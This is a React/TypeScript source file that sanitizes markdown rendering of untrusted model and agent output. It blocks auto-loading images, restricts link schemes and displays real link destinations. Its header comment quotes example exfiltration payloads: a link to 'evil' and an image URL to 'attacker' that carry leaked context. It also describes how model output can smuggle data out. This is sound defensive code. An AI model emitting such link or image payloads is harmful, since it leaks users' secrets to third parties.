import type { ReactNode } from 'react';
import { CodeBlock } from '../components/CodeBlock.js';

/**
 * Shared ReactMarkdown overrides for rendering UNTRUSTED model / agent output (chat bubbles, error
 * bubbles, agent messages). Centralized so EVERY such render path is sanitized identically and a new
 * ReactMarkdown can't silently reintroduce the exfiltration holes closed by Q-273 / Q-314 / Q-315:
 *
 *   - `a`   — a link like [click](https://evil/?leak=…) is a one-click exfil/phishing vector. Allow
 *             only http(s)/mailto, open with no referrer, and SHOW the real destination.
 *   - `img` — never auto-load: the fetch itself is a zero-click exfil beacon (the URL can carry
 *             context, e.g. `![](https://attacker/p?ctx=secret)`). Render the alt text instead.
 *   - `code`— fenced blocks go through CodeBlock; inline code gets a readable chip.
 *
 * Trusted, bundled content (the Docs viewer) intentionally does NOT use these — it needs real links
 * and images.
 */
// react-markdown passes loosely-typed props to custom renderers; narrow per-component below.
export const safeMarkdownComponents: Record<string, any> = {
    code({ inline, className, children, ...props }: { inline?: boolean; className?: string; children?: ReactNode }) {
        const match = /language-(\w+)/.exec(className || '');
        return (!inline && match) ? (
            <CodeBlock {...props} language={match[1]}>{children}</CodeBlock>
        ) : (
            <code {...props} className={`${className ?? ''} bg-zinc-100 dark:bg-zinc-800 px-1.5 py-0.5 rounded text-[13px] font-medium text-zinc-800 dark:text-zinc-200`}>
                {children}
            </code>
        );
    },
    img({ alt }: { alt?: string }) {
        return <span className="text-zinc-400 dark:text-zinc-500 italic">[image omitted: {alt || 'untitled'}]</span>;
    },
    a({ href, children }: { href?: string; children?: ReactNode }) {
        const url = typeof href === 'string' ? href : '';
        if (!/^(https?:|mailto:)/i.test(url)) return <span>{children}</span>;
        const arr = children as unknown;
        const textIsUrl = Array.isArray(arr) && typeof arr[0] === 'string' && arr[0] === url;
        return (
            <a href={url} target="_blank" rel="noopener noreferrer nofollow" title={url} className="text-purple-600 dark:text-purple-400 underline underline-offset-2">
                {children}{!textIsUrl && <span className="text-zinc-400 dark:text-zinc-500 text-[11px] ml-1">({url})</span>}
            </a>
        );
    },
};
